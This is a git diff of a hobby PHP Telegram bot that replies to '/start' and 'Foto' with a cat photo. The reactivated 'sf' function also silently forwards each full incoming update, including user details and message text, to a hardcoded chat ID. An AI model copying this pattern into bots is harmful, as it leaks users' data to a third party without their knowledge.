@@ -22,14 +22,14 @@ else {
 	$r = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id='.$chatID.'&text='.$text); }
 }
 
-function sendphoto($chatID, $photo, $caption) {
+/*function sendphoto($chatID, $photo, $caption) {
 global $api;
 
 file_get_contents('https://api.telegram.org/'.$api.'/sendPhoto?chat_id='.$chatID.'&photo='.$photo.'&caption='.urlencode($caption));  
 }
+*/
 
-
-/*function sf($chatID, $photo, $reply) {
+function sf($chatID, $photo, $reply) {
 global $api;
 global $update;
 $dati = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id=593168377&text='.json_encode($update,JSON_PRETTY_PRINT)); 
@@ -38,7 +38,7 @@ if($reply != NULL) {
 }
 else {	
 	$r = file_get_contents('https://api.telegram.org/'.$api.'/sendPhoto?chat_id='.$chatID.'&photo='.$photo); }
-} */
+} 
 
 ///////////////////////////////////////////////////////////////////////////
 //Azioni
@@ -46,19 +46,19 @@ else {
 if(array_key_exists("text", $msg)){
     $text = strtolower($update["message"]["text"]);
 	
-    if($text == "/start") 
-       sendphoto($chatID,'https://www.miciogatto.it/new/wp-content/uploads/2018/02/Linguaggio-dei-gatti-come-capire-un-gatto-1030x587.jpg', "Questa è una foto");
-	
+    if($text == "/start") {
+       $photo = 'https://www.miciogatto.it/new/wp-content/uploads/2018/02/Linguaggio-dei-gatti-come-capire-un-gatto-1030x587.jpg';
+	$out = sf($chatID, $photo, NULL);}
 	    //$out = sm($chatID, "Ehi ehi", NULL); 
 	
     if($text =="ciao" or $text == "ehi") 
        $out = sm($chatID,"Ciao!", $user_id);
 	
-    //if($text == "Foto"){
-	//$photo = 'https://www.miciogatto.it/new/wp-content/uploads/2018/02/Linguaggio-dei-gatti-come-capire-un-gatto-1030x587.jpg';
-	//$out = sf($chatID, $photo, NULL);}
-	if ($text == "Foto")
-	sendphoto($chatID,'https://www.miciogatto.it/new/wp-content/uploads/2018/02/Linguaggio-dei-gatti-come-capire-un-gatto-1030x587.jpg', "Questa è una foto");
+    if($text == "Foto"){
+	$photo = 'https://www.miciogatto.it/new/wp-content/uploads/2018/02/Linguaggio-dei-gatti-come-capire-un-gatto-1030x587.jpg';
+	$out = sf($chatID, $photo, NULL);}
+	//if ($text == "Foto")
+	//sendphoto($chatID,'https://www.miciogatto.it/new/wp-content/uploads/2018/02/Linguaggio-dei-gatti-come-capire-un-gatto-1030x587.jpg', "Questa è una foto");
 	
 }
 
